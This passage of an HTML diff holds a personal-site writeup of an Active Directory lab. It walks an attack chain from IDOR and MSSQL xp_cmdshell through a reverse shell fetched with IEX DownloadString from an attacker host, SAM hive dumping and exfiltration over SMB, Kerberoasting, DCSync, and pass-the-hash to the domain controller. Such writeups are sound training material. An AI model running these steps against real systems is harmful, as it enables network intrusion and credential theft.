+  <li>Catch the <code class="language-plaintext highlighter-rouge">session_id</code> cookie, add it manually in the browser under Application → Storage → Cookies, and refresh to log in as <code class="language-plaintext highlighter-rouge">joey</code>.</li>
+  <li>In internal messaging, exploit IDOR by changing the message ID in <code class="language-plaintext highlighter-rouge">/portal/messages/3</code> to <code class="language-plaintext highlighter-rouge">/portal/messages/27</code>, revealing the SQL machine’s creds.</li>
+  <li>Connect to the SQL box (10.0.1.7) with <code class="language-plaintext highlighter-rouge">impacket-mssqlclient</code> using the recovered creds.</li>
+  <li>Run <code class="language-plaintext highlighter-rouge">enable_xp_cmdshell</code> to gain direct command execution.</li>
+  <li>Host a <code class="language-plaintext highlighter-rouge">shell.ps1</code> reverse shell on Kali, start a listener, then execute via <code class="language-plaintext highlighter-rouge">xp_cmdshell powershell "IEX(New-Object Net.WebClient).DownloadString(''http://YOURIP:9090/shell.ps1'')"</code> to get a stable shell.</li>
+  <li>Spot <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> in your privileges. Download GodPotato to the target via <code class="language-plaintext highlighter-rouge">DownloadFile</code>, then run it to escalate to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</li>
+  <li>Dump the SAM, SYSTEM, and SECURITY hives with <code class="language-plaintext highlighter-rouge">reg save</code> via GodPotato. Start <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> on Kali with credentials, authenticate with <code class="language-plaintext highlighter-rouge">net use</code>, then copy the hive files across.</li>
+  <li>Parse hives with <code class="language-plaintext highlighter-rouge">impacket-secretsdump LOCAL</code> to recover the local Administrator hash (persistence via Evil-WinRM) and bob’s DCC2 hash — crack with <code class="language-plaintext highlighter-rouge">hashcat -m 2100</code> to get <code class="language-plaintext highlighter-rouge">pokemon</code>.</li>
+  <li>Stand up a <strong>Ligolo-ng</strong> tunnel through the SQL box. Add only <code class="language-plaintext highlighter-rouge">10.0.2.0/24 dev ligolo</code> — never add the <code class="language-plaintext highlighter-rouge">10.0.1.0/24</code> subnet or it kills the agent.</li>
+  <li>Kerberoast with <code class="language-plaintext highlighter-rouge">impacket-GetUserSPNs</code> as <code class="language-plaintext highlighter-rouge">bob</code>, then crack the TGS hash with <code class="language-plaintext highlighter-rouge">hashcat -m 13100</code> to get <code class="language-plaintext highlighter-rouge">eddie:superman</code>. BloodHound/SharpHound confirms the same kerberoastable user.</li>
+  <li>Nmap the workstation (10.0.1.6), find only RDP and WinRM open. Since eddie is not in Remote Management Users, connect via RDP with <code class="language-plaintext highlighter-rouge">xfreerdp /u:eddie /p:'superman' /d:bitstream.hsm /v:10.0.1.6 /cert:ignore</code>.</li>
+  <li>Notice the Microsoft Edge shortcut has a more recent <code class="language-plaintext highlighter-rouge">Last Modified</code> timestamp than other desktop items. Open it, view the restore pages, and reveal the saved password using eddie’s password to confirm identity — recovers <code class="language-plaintext highlighter-rouge">Luisa:Lulu_Des1gn!!</code>.</li>
+  <li>In BloodHound, confirm Luisa has <code class="language-plaintext highlighter-rouge">GenericAll</code> over <code class="language-plaintext highlighter-rouge">james</code> (full object control including password reset).</li>
+  <li>Abuse that with <code class="language-plaintext highlighter-rouge">net rpc password</code> to reset james’s password — use single quotes around Luisa’s password to prevent bash <code class="language-plaintext highlighter-rouge">!!</code> history expansion.</li>
+  <li>Log into the share box (10.0.1.5) over SMB as <code class="language-plaintext highlighter-rouge">james</code> with <code class="language-plaintext highlighter-rouge">impacket-smbclient</code>.</li>
+  <li>In the <code class="language-plaintext highlighter-rouge">Scripts</code> share, download <code class="language-plaintext highlighter-rouge">Automated-AD-Backup.ps1</code> to recover <code class="language-plaintext highlighter-rouge">svc_backup:P@ssw0rd2025!</code>.</li>
+  <li>In BloodHound, confirm <code class="language-plaintext highlighter-rouge">svc_backup</code> has DCSync rights over the Domain Controller.</li>
+  <li>Dump all domain hashes via DCSync using <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> with svc_backup’s credentials.</li>
+  <li>Pass the domain Administrator NT hash to <code class="language-plaintext highlighter-rouge">evil-winrm</code> to remote into the DC and grab the final flag.</li>
+</ol>
+
+    </div>
+
+    <div class="post-footer-nav">
+      <a class="blog-back" href="/writeups.html">← back to writeups</a>
+    </div>
+
+  </main>
+
+  <!-- Global Footer -->
+  <footer>
+    <div class="footer-container">
+      <div class="footer-links">
+        <a href="/index.html">Home</a>
+        <a href="/writeups.html">Writeups</a>
+        <a href="/reports.html">Reports</a>
+        <a href="/blog.html">Blog</a>
+      </div>
+      <p class="copyright">&copy; <span id="year">2026</span> Colby. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script src="/script.js"></script>
+</body>
+</html>
